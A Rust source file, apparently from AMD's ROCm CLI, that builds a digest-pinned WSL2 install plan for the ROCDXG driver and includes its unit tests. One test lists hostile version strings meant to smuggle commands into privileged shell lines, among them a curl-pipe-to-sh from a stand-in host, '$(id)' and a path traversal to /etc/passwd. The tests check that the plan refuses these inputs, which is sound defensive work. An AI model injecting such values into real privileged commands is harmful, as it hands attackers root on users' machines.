// Copyright © Advanced Micro Devices, Inc., or its affiliates.
//
// SPDX-License-Identifier: MIT

//! The WSL2 rocDXG driver plan: installing the digest-pinned `rocdxg-roct`
//! package that bridges the Windows host driver into the distro, and refusing to
//! build a plan when the package cannot be authenticated.
//!
//! Relocated from `driver_install.rs` with no behavior change.
//! `ROCDXG_PINNED_DIGESTS` is the trust anchor: the digests an unattended root
//! install is checked against. It moved byte for byte.
//!
//! A child of `driver_plan.rs`: it builds the plan with the model, the command
//! helper and the version-template resolver that stay in the parent, and the
//! parent re-exports `wsl_rocdxg_driver_plan` for the builders in
//! `driver_install.rs`. It also reads `truthy_env` from `therock.rs`.

use super::{
    DriverCommandPhase, DriverInstallPlan, PrivilegeEscalation, driver_command,
    driver_root_preflight_checks, resolve_shell_default_template,
};

/// Release of ROCDXG installed on WSL2, overridable for trying another build.
///
/// Resolved once at plan-build time via [`resolve_shell_default_template`], the
/// same way `ROCM_CLI_AMDGPU_DRIVER_VERSION` is validated for the bare-metal
/// repository pin. The concrete value is baked into the archive name, the release URL and
/// the `repo_version:` line, so the plan a user reviews names the build the
/// install will actually fetch rather than an unexpanded `${...}` placeholder.
///
/// How the default is chosen: the newest non-prerelease `librocdxg` release
/// whose `rocdxg-roct` digest is pinned in [`ROCDXG_PINNED_DIGESTS`]. Moving it
/// is two edits — add the `(version, digest)` row to that table, then change
/// the literal here — and the two must move together: a default with no row
/// makes [`resolve_rocdxg_verification`] refuse to build a plan at all unless
/// the caller supplies a digest, so a bump that forgets the table breaks every
/// default WSL install rather than falling back to the previous release.
///
/// Deliberately out of scope: `rocdxg-amd-smi-lib_<version>_amd64.deb`, which
/// v1.2.1 and v1.2.2 ship alongside `rocdxg-roct` and the five releases before
/// them do not, is not installed here. It is a second prefix under
/// `/opt/rocm-wsl` carrying its own `amd-smi` and `libamd_smi.so`, and it
/// installs an `/etc/profile.d` entry that sources the package's own
/// `/opt/rocm-wsl/.env.sh`, which in turn prepends that prefix to `PATH` and
/// `LD_LIBRARY_PATH` for new login shells. That is a system-wide environment
/// change in service of a monitoring utility that neither `wsl_rocdxg_ready`
/// nor `rocm serve` depends on, and it is not available for every version in
/// the pinned table. Installing it is a separate decision that belongs behind
/// its own opt-in, not folded into the plan whose job is to supply the runtime
/// bridge.
const ROCDXG_VERSION_EXPR: &str = "${ROCM_CLI_ROCDXG_VERSION:-1.2.2}";

/// Supplies a SHA-256 digest for the ROCDXG package, overriding the pinned one.
/// Required when installing a version this build has no digest for.
const ROCDXG_SHA256_ENV: &str = "ROCM_CLI_ROCDXG_SHA256";

/// Opts out of digest verification entirely, when set to an affirmative value.
/// Named explicitly so that shipping an unverified root install is a deliberate
/// act with an audit trail in the plan, rather than what happens when a variable
/// is simply unset.
const ROCDXG_ALLOW_UNVERIFIED_ENV: &str = "ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED";

/// SHA-256 digests of the `rocdxg-roct` package shipped with each published
/// ROCDXG release, taken from the release host's own asset metadata.
///
/// These exist so the default install is authenticated. The package is fetched
/// over plain HTTPS from a release page and then handed to `apt-get install`,
/// which runs its maintainer scripts as root — so without a digest, TLS to the
/// download host is the only thing standing between a compromised or swapped
/// artifact and root on the user's machine. That is materially weaker than the
/// bare-metal apt path in this same file, which installs from a repository
/// pinned with `signed-by=/etc/apt/keyrings/rocm.gpg`.
///
/// A version absent from this table is not installed unless the caller supplies
/// a digest via `ROCM_CLI_ROCDXG_SHA256` or opts out via
/// `ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED`; see [`resolve_rocdxg_verification`].
/// Add the new pair here when pinning a newer release. Nothing in the tree
/// checks a row against the published artifact, so a mistyped digest surfaces
/// only as a failed install on a WSL host — fail-closed, but confusing. Take
/// the value from the release's own asset metadata, or recompute it:
///
/// ```text
/// curl -L --fail \
///   https://github.com/ROCm/librocdxg/releases/download/v<version>/rocdxg-roct_<version>_amd64.deb \
///   | sha256sum
/// ```
const ROCDXG_PINNED_DIGESTS: &[(&str, &str)] = &[
    (
        "1.0.0",
        "5e78d300dfb8c10dfd57de24b312ff9f9962a3a971f571e5e9383e1c543b607a",
    ),
    (
        "1.1.0",
        "d1f92415d218ca10df3c39f2ce48872ee968549a97191e987f2c2a79ab709f23",
    ),
    (
        "1.1.1",
        "cd2ba9dbfd32bf35755a45e7e92410524f32baa2b4dcc31d0106876d04c3abcc",
    ),
    (
        "1.1.2",
        "e426a5f58f4f177512a354ed5f0dd7b2c0a2b736f009e09bf806edf18ca6cb97",
    ),
    (
        "1.2.0",
        "3ed9526719290cd8f590150dad8ea0f234fa779bea6a4c9a8449d7ae6b8cfb6e",
    ),
    (
        "1.2.1",
        "7889eef45a1132ed2dde88d8ea1356bf791ec9c05802a18940bc81b970e850e0",
    ),
    (
        "1.2.2",
        "28ded1254811192ebace1f76c0227580184af7b27ab2475fb9728295a702d541",
    ),
];

/// Whether a resolved ROCDXG version is safe to place in the plan's commands.
///
/// The driver plan is a list of shell lines run through `sh -c`, and the
/// version is interpolated into three of them — the archive name, the release
/// URL and the local path — each of which is then executed with `sudo` already
/// primed by an earlier `apt-get update`. `ROCM_CLI_ROCDXG_VERSION` reaches
/// this unchanged from the environment, so a value containing `;` or a
/// backtick would otherwise end the intended command and start an attacker's
/// own. Restricting it to characters that appear in a Debian package version
/// removes the possibility rather than trying to escape it.
fn rocdxg_version_is_well_formed(version: &str) -> bool {
    !version.is_empty()
        && version.starts_with(|c: char| c.is_ascii_alphanumeric())
        && version
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '+' | '-' | '~'))
}

/// Whether a string is a bare lowercase 64-character hex SHA-256 digest, the
/// form `sha256sum -c -` expects.
fn sha256_digest_is_well_formed(digest: &str) -> bool {
    digest.len() == 64 && digest.chars().all(|c| c.is_ascii_hexdigit())
}

/// How the downloaded ROCDXG package will be authenticated before it is
/// installed as root.
#[derive(Debug, Clone, Eq, PartialEq)]
enum RocdxgVerification {
    /// Check the download against this digest and abort the install on a
    /// mismatch.
    Digest(String),
    /// Install without checking, because the caller explicitly asked for it.
    OptedOut,
}

/// Decide how a ROCDXG download will be authenticated, or `Err` with the reason
/// no plan can be built.
///
/// Resolution order — an explicit digest wins over the pinned one so a user can
/// install an artifact this build predates without having to disable
/// verification wholesale:
///
/// 1. `ROCM_CLI_ROCDXG_SHA256`, when it is a well-formed digest.
/// 2. The digest pinned for this version in [`ROCDXG_PINNED_DIGESTS`].
/// 3. `ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED`, when set to an affirmative value
///    — see [`crate::therock::truthy_env`] for the exact allowlist — which opts
///    out. `0` and `false` do not.
///
/// Nothing left means refusal. Verification is therefore opt-*out*: the failure
/// mode of an unset variable is a plan that will not run, not a root install of
/// an unauthenticated package.
fn resolve_rocdxg_verification(version: &str) -> Result<RocdxgVerification, String> {
    if let Some(supplied) = std::env::var(ROCDXG_SHA256_ENV)
        .ok()
        .map(|value| value.trim().to_ascii_lowercase())
        .filter(|value| !value.is_empty())
    {
        if !sha256_digest_is_well_formed(&supplied) {
            return Err(format!(
                "{ROCDXG_SHA256_ENV} is not a 64-character hex SHA-256 digest; refusing to install ROCDXG without a usable digest."
            ));
        }
        return Ok(RocdxgVerification::Digest(supplied));
    }

    if let Some(pinned) = ROCDXG_PINNED_DIGESTS
        .iter()
        .find_map(|(pinned_version, digest)| (*pinned_version == version).then_some(*digest))
    {
        return Ok(RocdxgVerification::Digest(pinned.to_owned()));
    }

    // An allowlist of affirmative values, not "set to anything non-empty":
    // otherwise `ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED=0` — which every reader takes
    // for "off" — would turn digest checking off for a package installed as
    // root. Anything this does not recognise leaves verification on.
    if crate::therock::truthy_env(ROCDXG_ALLOW_UNVERIFIED_ENV) {
        return Ok(RocdxgVerification::OptedOut);
    }

    Err(format!(
        "no known SHA-256 digest for ROCDXG {version}, and this package is installed as root. Set {ROCDXG_SHA256_ENV} to the digest published with that release, or set {ROCDXG_ALLOW_UNVERIFIED_ENV}=1 to install without verifying it."
    ))
}

/// A WSL plan that cannot be run, carrying the reason in the same shape every
/// other unsupported plan uses so `--dry-run`, the approval prompt and
/// `state.json` all report it identically.
fn wsl_rocdxg_refusal_plan(repo_version: String, reason: String) -> DriverInstallPlan {
    DriverInstallPlan {
        supported: false,
        mutating: false,
        policy: "wsl_rocdxg".to_owned(),
        os_id: "wsl".to_owned(),
        version_id: String::new(),
        codename: String::new(),
        repo_version_expr: repo_version,
        reason,
        preflight_checks: Vec::new(),
        commands: Vec::new(),
        checks: vec!["rocm examine".to_owned(), "rocm diagnose".to_owned()],
        reboot_required: false,
    }
}

/// The `rocm install driver` plan for a WSL2 host.
///
/// WSL2 has no in-tree amdgpu driver to install: the GPU comes from the Windows
/// host driver through `/dev/dxg`, and what ROCm needs on the Linux side is
/// ROCDXG (`librocdxg`), which bridges the runtime to it. Without that library
/// `rocm examine` reports `wsl_rocdxg_missing` and `rocm serve` refuses with
/// "no usable AMD GPU detected", even though a gfx target is detected — the
/// target is read from the Windows-side driver.
///
/// This used to be a refusal pointing at a shell script under `scripts/`, which
/// ships only in a git checkout — never in the release bundle — so it was a dead
/// end for anyone who installed the CLI normally. These are that script's steps;
/// it has been removed rather than left as a second, untested copy of them.
pub(crate) fn wsl_rocdxg_driver_plan(escalation: PrivilegeEscalation) -> DriverInstallPlan {
    let version = resolve_shell_default_template(ROCDXG_VERSION_EXPR);
    if !rocdxg_version_is_well_formed(&version) {
        return wsl_rocdxg_refusal_plan(
            // The rejected value is still rendered into the plan's
            // `repo_version:` line so the user can see what was refused — but
            // that line is part of a plan a human reads to decide, and a raw
            // value containing a newline could forge further lines in it. The
            // debug form escapes newlines and makes trailing space visible,
            // which is exactly what is wanted for a value being shown as
            // rejected.
            format!("{version:?}"),
            "ROCM_CLI_ROCDXG_VERSION is not a well-formed package version. It is interpolated into privileged shell commands, so only letters, digits, and `. + - ~` are accepted.".to_owned(),
        );
    }
    let verification = match resolve_rocdxg_verification(&version) {
        Ok(verification) => verification,
        Err(reason) => return wsl_rocdxg_refusal_plan(version, reason),
    };

    let sudo = escalation.prefix();
    let deb = format!("rocdxg-roct_{version}_amd64.deb");
    let url = format!("https://github.com/ROCm/librocdxg/releases/download/v{version}/{deb}");
    let deb_path = format!("/tmp/{deb}");
    // `version` is validated above and the digest is hex, so neither can carry
    // shell metacharacters; the quotes keep that guarantee local to the command
    // rather than resting on a check several functions away.
    let verify_download = match &verification {
        RocdxgVerification::Digest(digest) => driver_command(
            DriverCommandPhase::Execute,
            &format!("printf '%s  %s\\n' '{digest}' '{deb_path}' | sha256sum -c -"),
        ),
        RocdxgVerification::OptedOut => driver_command(
            DriverCommandPhase::Execute,
            &format!(
                "echo 'warning: installing ROCDXG {version} without verifying it ({ROCDXG_ALLOW_UNVERIFIED_ENV} is set)' >&2"
            ),
        ),
    };
    DriverInstallPlan {
        supported: true,
        mutating: true,
        policy: "wsl_rocdxg".to_owned(),
        os_id: "wsl".to_owned(),
        version_id: String::new(),
        codename: String::new(),
        repo_version_expr: version,
        reason:
            "WSL2 uses the Windows host driver plus ROCDXG, not Linux DKMS; this installs ROCDXG."
                .to_owned(),
        // Read, not run: the GPU plumbing belongs to the WSL platform, so if it
        // is absent the fix is on the Windows side and no Linux package helps.
        // The Execute phase fails on the same two paths rather than installing
        // a library with nothing to bind to.
        preflight_checks: {
            let mut checks = vec![
                "/dev/dxg (WSL GPU device)".to_owned(),
                "/usr/lib/wsl/lib/libdxcore.so (WSL dxcore runtime)".to_owned(),
            ];
            checks.extend(driver_root_preflight_checks(escalation));
            checks
        },
        commands: vec![
            driver_command(
                DriverCommandPhase::Prepare,
                "test -e /dev/dxg || { echo 'error: /dev/dxg is missing; WSL GPU plumbing is not available' >&2; exit 1; }",
            ),
            driver_command(
                DriverCommandPhase::Prepare,
                "test -e /usr/lib/wsl/lib/libdxcore.so || { echo 'error: /usr/lib/wsl/lib/libdxcore.so is missing' >&2; exit 1; }",
            ),
            // Say why up front rather than letting the first privileged step die
            // with `sudo: command not found`, which reads like a broken plan.
            // Skipped when already root: the plan emits no `sudo` at all then,
            // so demanding the binary would state a precondition it is not
            // relying on.
            driver_command(
                DriverCommandPhase::Prepare,
                if escalation.needs_sudo_binary() {
                    "command -v sudo >/dev/null 2>&1 || { echo 'error: sudo is required to install ROCDXG under /opt/rocm' >&2; exit 1; }"
                } else {
                    "test \"$(id -u)\" -eq 0 || { echo 'error: this plan was built to run as root' >&2; exit 1; }"
                },
            ),
            driver_command(
                DriverCommandPhase::Prepare,
                &format!("{sudo}apt-get update"),
            ),
            driver_command(
                DriverCommandPhase::Prepare,
                &format!("{sudo}apt-get install -y ca-certificates curl"),
            ),
            driver_command(
                DriverCommandPhase::Execute,
                &format!("curl -L --fail --show-error --output '{deb_path}' '{url}'"),
            ),
            // Authenticating the download is the whole trust anchor for this
            // plan: everything after it runs the package's maintainer scripts
            // as root. `sha256sum -c -` exits non-zero on a mismatch, which
            // aborts the plan before the install step.
            verify_download,
            driver_command(
                DriverCommandPhase::Execute,
                &format!("{sudo}apt-get install -y '{deb_path}'"),
            ),
            driver_command(DriverCommandPhase::Execute, &format!("{sudo}ldconfig")),
            driver_command(
                DriverCommandPhase::Verify,
                "test -e /opt/rocm/lib/librocdxg.so",
            ),
            driver_command(
                DriverCommandPhase::Verify,
                "ldconfig -p | grep -q 'librocdxg\\.so'",
            ),
        ],
        // `rocm diagnose` carries the WSL catalog, including the host-side
        // form that inspects a distro over `wsl.exe` without needing anything
        // installed inside it.
        checks: vec!["rocm examine".to_owned(), "rocm diagnose".to_owned()],
        // Userspace only: `ldconfig` publishes the library in this boot.
        reboot_required: false,
    }
}

#[cfg(test)]
use crate::tests::ScopedTestEnv;

#[cfg(test)]
/// Clear every input that steers the ROCDXG plan, so a value exported in
/// the developer's or runner's shell cannot decide the outcome of a test
/// that is asserting on the default.
///
/// Builds on [`ScopedTestEnv::with_amd_overrides_cleared`] rather than
/// `new` so a caller that also exercises the bare-metal AMDGPU override
/// through the same `build_driver_install_plan_at` call doesn't need a
/// second guard: one helper covers both input sets regardless of which
/// branch actually reads them.
pub(crate) fn scoped_rocdxg_env() -> ScopedTestEnv {
    let mut env = ScopedTestEnv::with_amd_overrides_cleared();
    env.clear("ROCM_CLI_ROCDXG_VERSION");
    env.clear(ROCDXG_SHA256_ENV);
    env.clear(ROCDXG_ALLOW_UNVERIFIED_ENV);
    env
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::driver_plan::render_driver_install_plan;
    #[cfg(unix)]
    use crate::tests::test_paths;
    #[cfg(unix)]
    use std::fs;
    #[cfg(unix)]
    use std::path::Path;

    #[test]
    fn wsl_rocdxg_plan_installs_the_library_and_publishes_it() {
        // Asserts on the default plan, so it has to take the same guard as the
        // mutating tests in this binary: a concurrent test exporting
        // `ROCM_CLI_ROCDXG_VERSION` would otherwise steer this one's plan.
        let _env = scoped_rocdxg_env();
        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
        let commands = plan.execution_commands().join("\n");

        // Fetches the release artifact, installs it, and makes the linker see
        // it. Any one of these missing leaves `wsl_rocdxg_ready` unreachable.
        assert!(commands.contains("https://github.com/ROCm/librocdxg/releases/download/"));
        assert!(commands.contains("rocdxg-roct_"));
        assert!(commands.contains("sudo apt-get install -y '/tmp/rocdxg-roct_"));
        assert!(commands.contains("sudo ldconfig"));

        // And in that order. `ldconfig` refreshes the cache from what is on
        // disk now, so running it before `apt-get install` has unpacked
        // `librocdxg.so` scans a directory that does not contain it yet and
        // publishes nothing — leaving the plan reporting success while the
        // `ldconfig -p` verification below is the only thing that would notice.
        // Both steps are still present under that swap, so every `contains`
        // assertion in this file stays green; only a position comparison
        // catches it.
        let steps = plan.execution_commands();
        let install = steps
            .iter()
            .position(|c| c.contains("apt-get install -y '/tmp/"))
            .expect("plan installs the package");
        let publish = steps
            .iter()
            .position(|c| c.trim_end().ends_with("ldconfig"))
            .expect("plan publishes the library");
        assert!(
            install < publish,
            "ldconfig must run after the package is installed:\n{}",
            steps.join("\n")
        );

        // Verification asserts the two things `examine` keys `wsl_rocdxg_ready`
        // on, so a silently partial install cannot report success.
        let verify = plan
            .commands
            .iter()
            .filter(|c| c.phase == DriverCommandPhase::Verify)
            .map(|c| c.command.clone())
            .collect::<Vec<_>>()
            .join("\n");
        assert!(verify.contains("/opt/rocm/lib/librocdxg.so"));
        assert!(verify.contains("ldconfig -p"));
    }

    #[test]
    fn wsl_rocdxg_plan_guards_the_gpu_plumbing_before_any_mutating_command() {
        // /dev/dxg and dxcore come from the Windows side. If they are missing,
        // installing the bridge library accomplishes nothing, so the plan must
        // stop rather than report a successful install of something inert.
        let _env = scoped_rocdxg_env();
        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
        let prepare = plan
            .commands
            .iter()
            .filter(|c| c.phase == DriverCommandPhase::Prepare)
            .map(|c| c.command.clone())
            .collect::<Vec<_>>();
        let joined = prepare.join("\n");
        assert!(joined.contains("/dev/dxg"));
        assert!(joined.contains("/usr/lib/wsl/lib/libdxcore.so"));
        // Named explicitly, rather than surfacing as `sudo: command not found`
        // from whichever privileged step happened to run first.
        assert!(joined.contains("command -v sudo"));
        // Both guards run before anything is fetched or installed.
        let first_mutation = plan
            .execution_commands()
            .iter()
            .position(|c| c.contains("apt-get") || c.contains("curl"))
            .expect("plan installs something");
        let last_guard = plan
            .execution_commands()
            .iter()
            .rposition(|c| c.contains("is missing"))
            .expect("plan guards the plumbing");
        assert!(
            last_guard < first_mutation,
            "plumbing guards must precede the first mutating command"
        );
    }

    #[test]
    fn wsl_rocdxg_download_is_verified_against_a_pinned_digest_by_default() {
        // The package is installed with `apt-get install`, which runs its
        // maintainer scripts as root. With no digest, TLS to the release host
        // is the only thing authenticating that download — weaker than the
        // bare-metal path in this same file, which installs from a
        // `signed-by=` pinned repository. So the default plan must verify.
        let _env = scoped_rocdxg_env();
        let commands = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo).execution_commands();
        let joined = commands.join("\n");

        let pinned = ROCDXG_PINNED_DIGESTS
            .iter()
            .find_map(|(version, digest)| (*version == "1.2.2").then_some(*digest))
            .expect("the default version is pinned");
        assert!(joined.contains(pinned), "{joined}");
        assert!(joined.contains("sha256sum -c -"), "{joined}");

        // Not a conditional: an unset variable must not be able to turn
        // verification off, which is what the previous `if [ -n ... ]` form
        // did.
        assert!(
            !joined.contains("skipping checksum verification"),
            "{joined}"
        );
        assert!(!joined.contains(ROCDXG_SHA256_ENV), "{joined}");

        // Ordering is the whole point — a digest checked after the install has
        // already run is decoration.
        let check = commands
            .iter()
            .position(|c| c.contains("sha256sum -c -"))
            .expect("plan verifies the download");
        let install = commands
            .iter()
            .position(|c| c.contains("apt-get install -y '/tmp/"))
            .expect("plan installs the package");
        assert!(check < install, "digest must be checked before install");
    }

    #[test]
    fn wsl_rocdxg_refuses_a_version_whose_digest_is_unknown() {
        // An unpinned version is the case where silently falling back to "no
        // verification" would be most dangerous, because it is reachable from
        // a single environment variable.
        let mut env = scoped_rocdxg_env();
        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");

        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
        assert!(!plan.supported);
        assert!(!plan.mutating);
        assert!(plan.commands.is_empty(), "a refusal must run nothing");
        assert!(plan.reason.contains(ROCDXG_SHA256_ENV), "{}", plan.reason);
        assert!(
            plan.reason.contains(ROCDXG_ALLOW_UNVERIFIED_ENV),
            "{}",
            plan.reason
        );
    }

    #[test]
    fn wsl_rocdxg_accepts_a_supplied_digest_for_an_unpinned_version() {
        // The escape hatch for a release newer than this build: supply the
        // digest rather than disabling verification.
        let mut env = scoped_rocdxg_env();
        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
        let supplied = "a".repeat(64);
        env.set(ROCDXG_SHA256_ENV, &supplied);

        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
        assert!(plan.supported);
        let joined = plan.execution_commands().join("\n");
        assert!(joined.contains(&supplied), "{joined}");
        assert!(joined.contains("sha256sum -c -"), "{joined}");
    }

    #[test]
    fn wsl_rocdxg_rejects_a_malformed_supplied_digest() {
        // A truncated or mistyped digest must not silently fall back to the
        // pinned one, which would verify a different artifact than the user
        // asked for and report success.
        let mut env = scoped_rocdxg_env();
        env.set(ROCDXG_SHA256_ENV, "not-a-digest");

        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
        assert!(!plan.supported);
        assert!(plan.commands.is_empty());
        assert!(plan.reason.contains(ROCDXG_SHA256_ENV), "{}", plan.reason);
    }

    #[test]
    fn wsl_rocdxg_unverified_install_takes_an_explicit_opt_out() {
        // Installing unverified stays possible — it just has to be asked for,
        // and the plan the user approves has to say so.
        let mut env = scoped_rocdxg_env();
        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
        env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, "1");

        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
        assert!(plan.supported);
        let joined = plan.execution_commands().join("\n");
        assert!(!joined.contains("sha256sum -c -"), "{joined}");
        assert!(joined.contains("without verifying it"), "{joined}");
    }

    #[test]
    fn wsl_rocdxg_opt_out_reads_negative_values_as_off() {
        // The opt-out is a boolean, not a presence check. Reading "set to
        // anything" as yes would turn digest verification off for a package
        // installed as root on the strength of `=0` — the one value a reader
        // writes when they mean the opposite.
        for negative in ["0", "false", "no", "off", ""] {
            let mut env = scoped_rocdxg_env();
            env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
            env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, negative);

            let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
            assert!(
                !plan.supported,
                "{ROCDXG_ALLOW_UNVERIFIED_ENV}={negative:?} disabled verification"
            );
            assert!(
                plan.commands.is_empty(),
                "{ROCDXG_ALLOW_UNVERIFIED_ENV}={negative:?} built an unverified install"
            );
        }

        // The affirmative spellings still work, so this is a narrowing of what
        // counts as yes rather than a removal of the escape hatch.
        for affirmative in ["1", "true", "yes", "on"] {
            let mut env = scoped_rocdxg_env();
            env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
            env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, affirmative);

            let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
            assert!(
                plan.supported,
                "{ROCDXG_ALLOW_UNVERIFIED_ENV}={affirmative:?} was not honoured"
            );
        }
    }

    #[test]
    fn wsl_rocdxg_refuses_a_version_that_could_escape_the_shell() {
        // `ROCM_CLI_ROCDXG_VERSION` is interpolated into commands executed via
        // `sh -c` after `apt-get update` has primed the sudo credential cache,
        // so a `;` in it would start a second, attacker-chosen command running
        // as root. The plan must refuse rather than quote its way out.
        for hostile in [
            "1.2.0; curl http://example.invalid/x | sh",
            "1.2.0 && id",
            "$(id)",
            "1.2.0`id`",
            "../../etc/passwd",
            "1.2.0\nid",
            "1.2.0 ",
        ] {
            let mut env = scoped_rocdxg_env();
            env.set("ROCM_CLI_ROCDXG_VERSION", hostile);
            // An opt-out must not buy past the version check either.
            env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, "1");

            let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
            assert!(!plan.supported, "accepted hostile version {hostile:?}");
            assert!(
                plan.commands.is_empty(),
                "built commands from hostile version {hostile:?}"
            );
            // The refused value is echoed back in the plan a human reads, so it
            // must not be able to forge lines there. Every line the renderer
            // emits after the header is indented, so an unindented one came
            // from the value.
            let rendered = render_driver_install_plan(&plan, false, false);
            for line in rendered.lines().skip(1) {
                assert!(
                    line.starts_with("  "),
                    "hostile version {hostile:?} forged plan line {line:?} in:\n{rendered}"
                );
            }
        }
    }

    #[test]
    fn wsl_rocdxg_plan_drops_sudo_when_already_root() {
        // Same reason the bare-metal plans take an escalation: containers and
        // minimal cloud images run as uid 0 with no `sudo` binary, where an
        // unconditional prefix kills every command before any driver work.
        let _env = scoped_rocdxg_env();
        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::AlreadyRoot);
        let joined = plan.execution_commands().join("\n");
        assert!(!joined.contains("sudo "), "{joined}");
        assert!(joined.contains("apt-get install -y '/tmp/"), "{joined}");
        // And it must not demand a binary it no longer uses.
        assert!(!joined.contains("command -v sudo"), "{joined}");
        assert!(
            !plan
                .preflight_checks
                .iter()
                .any(|check| check.contains("`sudo` command is available")),
            "{:?}",
            plan.preflight_checks
        );
    }

    /// Runs the digest step the plan actually generates, rather than asserting
    /// that it contains some substrings.
    ///
    /// The step this exercises is the trust anchor for a root install, and the
    /// executable self-test that used to cover it was deleted along with
    /// `scripts/wsl_setup_rocdxg.sh`. Substring assertions would let a quoting,
    /// field-order or newline regression in the `printf | sha256sum -c -`
    /// fragment ship green, so the generated command is pinned whole with
    /// `assert_eq!` and then executed — with only the two values it embeds
    /// redirected at a test payload, so the quoting, spacing and field order
    /// under test are production's rather than a replica's.
    ///
    /// Field order in particular is invisible to a `starts_with`/`ends_with`
    /// pair: `sha256sum -c -` reads `DIGEST  FILENAME`, so emitting the path
    /// first breaks every real WSL install while still starting with
    /// `printf '%s  %s\n' '` and ending with `' | sha256sum -c -`.
    #[cfg(unix)]
    #[test]
    fn wsl_rocdxg_generated_digest_step_accepts_only_the_matching_file() {
        use std::process::Command;

        let _env = scoped_rocdxg_env();
        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
        let version = plan.repo_version_expr.clone();
        let pinned = ROCDXG_PINNED_DIGESTS
            .iter()
            .find_map(|(pinned_version, digest)| {
                (*pinned_version == version.as_str()).then_some(*digest)
            })
            .expect("the default version is pinned");
        let deb_path = format!("/tmp/rocdxg-roct_{version}_amd64.deb");
        let generated = plan
            .execution_commands()
            .into_iter()
            .find(|c| c.contains("sha256sum -c -"))
            .expect("plan verifies the download");

        // Whole-string, not `contains`: the digest has to come first and the
        // two fields have to be separated by exactly the two spaces
        // `sha256sum -c -` expects.
        assert_eq!(
            generated,
            format!("printf '%s  %s\\n' '{pinned}' '{deb_path}' | sha256sum -c -")
        );

        let (root, _paths) = test_paths("wsl-rocdxg-digest");
        fs::create_dir_all(&root).expect("test root");
        let payload = root.join(format!("rocdxg-roct_{version}_amd64.deb"));
        fs::write(&payload, b"pretend this is a .deb\n").expect("write payload");

        let digest_of = |path: &Path| -> String {
            let out = Command::new("sha256sum")
                .arg(path)
                .output()
                .expect("sha256sum runs");
            assert!(out.status.success());
            String::from_utf8(out.stdout)
                .expect("utf8")
                .split_whitespace()
                .next()
                .expect("digest field")
                .to_owned()
        };
        let good = digest_of(&payload);

        // The command under test is the generated one; the only edits are the
        // digest being checked and the path being checked, so a regression in
        // how the fragment is built reaches `sh` here instead of being masked
        // by a replica built to the test's own idea of the right shape.
        let step = |digest: &str| -> bool {
            let command = generated
                .replace(pinned, digest)
                .replace(&deb_path, &payload.display().to_string());
            Command::new("sh")
                .arg("-c")
                .arg(&command)
                .output()
                .expect("sh runs")
                .status
                .success()
        };

        assert!(step(&good), "the matching digest must pass");
        assert!(
            !step(&"0".repeat(64)),
            "a mismatched digest must fail the step"
        );
        assert!(!step("deadbeef"), "a malformed digest must fail the step");
        assert!(!step(""), "an empty digest must fail the step");

        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn wsl_rocdxg_version_is_overridable_and_reaches_every_reference() {
        // One resolved value drives the archive name, the release tag and the
        // download path, so an override cannot leave a URL pointing at the
        // default. The value is resolved at plan-build time rather than left as
        // a `${VAR:-default}` template, so the plan the user reviews names the
        // build the install will actually fetch.
        let mut env = scoped_rocdxg_env();

        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
        assert_eq!(plan.repo_version_expr, "1.2.2");
        let commands = plan.execution_commands().join("\n");
        // The version is resolved here, not deferred to the shell: the plan the
        // user approves has to name the build the install will actually fetch.
        // No `${...}` expansion survives into the commands at all — the digest
        // is resolved at plan-build time too, which
        // `wsl_rocdxg_download_is_verified_against_a_pinned_digest_by_default`
        // asserts by name.
        assert!(
            !commands.contains("ROCM_CLI_ROCDXG_VERSION"),
            "version must be resolved at plan-build time, not left as a shell template:\n{commands}"
        );
        let occurrences = commands.matches("1.2.2").count();
        assert!(
            occurrences >= 3,
            "version should drive the deb name, the tag and the path; saw {occurrences}"
        );

        // An override has to reach every one of those references, including the
        // release URL — the bug this guards is a URL left on the default. The
        // digest comes along because an unpinned version is refused outright;
        // see `wsl_rocdxg_refuses_a_version_whose_digest_is_unknown`.
        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
        env.set(ROCDXG_SHA256_ENV, &"b".repeat(64));
        let overridden = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
        assert_eq!(overridden.repo_version_expr, "9.9.9");
        let commands = overridden.execution_commands().join("\n");
        assert!(
            commands.contains("rocdxg-roct_9.9.9_amd64.deb"),
            "{commands}"
        );
        assert!(
            commands.contains(
                "https://github.com/ROCm/librocdxg/releases/download/v9.9.9/rocdxg-roct_9.9.9_amd64.deb"
            ),
            "{commands}"
        );
        assert!(
            !commands.contains("1.2.2"),
            "override left a reference on the default version:\n{commands}"
        );
    }
}
